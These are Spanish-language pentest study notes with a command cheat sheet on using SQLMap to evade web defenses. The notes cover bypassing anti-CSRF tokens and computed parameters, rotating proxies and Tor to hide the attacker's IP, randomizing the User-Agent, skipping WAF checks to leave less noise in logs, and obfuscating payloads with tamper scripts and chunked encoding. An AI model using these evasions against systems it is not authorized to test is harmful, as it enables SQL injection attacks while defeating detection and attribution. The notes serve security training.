---
tags:
  - webapp
  - sqlmap
  - bypass
---
## Conceptos Clave (TL;DR)

* Las aplicaciones web implementan protecciones como tokens anti-CSRF, valores únicos requeridos por petición o bloqueos por User-Agent para evitar la explotación automatizada.

* SQLMap cuenta con mecanismos integrados para evadir dinámicamente estas protecciones sin necesidad de intervención manual constante.

* Las técnicas de evasión incluyen el análisis automático de respuestas para extraer tokens frescos, la evaluación de código en tiempo real para generar hashes, y la ofuscación de payloads mediante scripts de manipulación (tamper scripts).

  

## Herramientas Clave

* **SQLMap**: Framework principal de automatización de inyección SQL que incluye todas las funcionalidades de evasión detalladas.

* **Tor**: Red de anonimato que puede integrarse para ocultar la dirección IP del atacante rotando entre nodos de salida.

* **identYwaf**: Librería de terceros integrada en SQLMap que contiene firmas de 80 soluciones WAF diferentes para su identificación automática.

  

## Metodología Paso a Paso

* **Fase 1: Reconocimiento y Detección de Protecciones**

  SQLMap enviará un payload inicial de prueba en un parámetro inexistente para verificar la presencia de un WAF. Si el servidor responde con errores inmediatos (ej. 5XX o 406 Not Acceptable), identifica qué capa está bloqueando la petición.

* **Fase 2: Evasión a Nivel de Red y HTTP**

  Si tu IP o User-Agent están en listas negras, altera la firma de red. Asigna un User-Agent aleatorio o enruta el tráfico a través de proxies o la red Tor para mantener el acceso al objetivo.

* **Fase 3: Evasión de Controles de Estado y Parámetros**

  Si la aplicación requiere tokens CSRF, valores únicos o parámetros calculados (ej. MD5), configura SQLMap para extraerlos de la respuesta anterior, aleatorizarlos o calcularlos en tiempo real con Python.

* **Fase 4: Evasión de WAF/IPS (Ofuscación de Payload)**

  Cuando el filtro detecta el ataque de inyección SQL, utiliza "tamper scripts" encadenados, codificación de transferencia fragmentada (chunked) o contaminación de parámetros HTTP (HPP) para alterar la sintaxis del payload y eludir las reglas de firmas.

  

## Cheat Sheet de Comandos

```bash
# Evasión de Tokens Anti-CSRF parseando la respuesta del objetivo

sqlmap -u "<TARGET_URL>" --data="id=1&<CSRF_PARAM>=<TOKEN_VALUE>" --csrf-token="<CSRF_PARAM>"
```
  
```bash
# Evasión por valor único requerido (aleatoriza un parámetro específico)

sqlmap -u "<TARGET_URL>?id=1&<RANDOM_PARAM>=<INITIAL_VALUE>" --randomize=<RANDOM_PARAM> --batch -v 5
```
  
```bash
# Evasión de parámetros calculados (ej. generar un hash MD5 en tiempo real antes de enviar)

sqlmap -u "<TARGET_URL>?id=1&<HASH_PARAM>=<INITIAL_HASH>" --eval="import hashlib; <HASH_PARAM>=hashlib.md5(id).hexdigest()" --batch -v 5
```
  
```bash
# Ocultación de IP mediante Proxy (ej. SOCKS4)

sqlmap -u "<TARGET_URL>" --proxy="socks4://<PROXY_IP>:<PROXY_PORT>"
```
  
```bash
# Ocultación de IP rotando sobre una lista de proxies en caso de bloqueos secuenciales

sqlmap -u "<TARGET_URL>" --proxy-file="<PATH_TO_PROXY_LIST_FILE>"
```
  
```bash
# Ocultación de IP usando la red Tor (busca localmente puertos 9050 o 9150) y verifica conexión

sqlmap -u "<TARGET_URL>" --tor --check-tor
```
  
```bash
# Omite la prueba heurística inicial de WAF para generar menos ruido en los logs

sqlmap -u "<TARGET_URL>" --skip-waf
```
  
```bash
# Evasión de listas negras de User-Agent (selecciona uno aleatorio del pool de SQLMap)

sqlmap -u "<TARGET_URL>" --random-agent
```
  
```bash
# Modificación de payloads mediante Tamper Scripts (se pueden encadenar por comas)

sqlmap -u "<TARGET_URL>" --tamper=<TAMPER_SCRIPT_1>,<TAMPER_SCRIPT_2>
```
 
```bash
# Listar todos los Tamper Scripts disponibles con su descripción

sqlmap --list-tampers
```
  
```bash
# Evasión dividiendo el cuerpo de la petición POST en fragmentos (Chunked Transfer Encoding)

sqlmap -u "<TARGET_URL>" --chunked
```

  

## "Gotchas" y Troubleshooting

* Si un parámetro contiene los infijos comunes "csrf", "xsrf" o "token", SQLMap preguntará automáticamente si deseas actualizarlo en las siguientes peticiones sin necesidad de declarar `--csrf-token` explícitamente.

* El WAF ModSecurity suele devolver una respuesta HTTP `406 - Not Acceptable` ante los payloads inofensivos de detección (ej. `?pfov=...`) que envía SQLMap.

* Un error HTTP 5XX inmediato al iniciar un escaneo suele ser indicativo de que el objetivo ha puesto en lista negra el User-Agent por defecto de SQLMap (ej. `sqlmap/1.4.9 (http://sqlmap.org)`).

* Los Tamper Scripts se ejecutan siguiendo un orden de prioridad predefinido de forma interna, ya que algunos modifican directamente la sintaxis SQL (ej. `ifnull2ifisnull`) y podrían causar conflictos no deseados.

* La técnica de HTTP Parameter Pollution (HPP) depende enteramente de que la plataforma de destino (como ASP) soporte la concatenación de parámetros con el mismo nombre.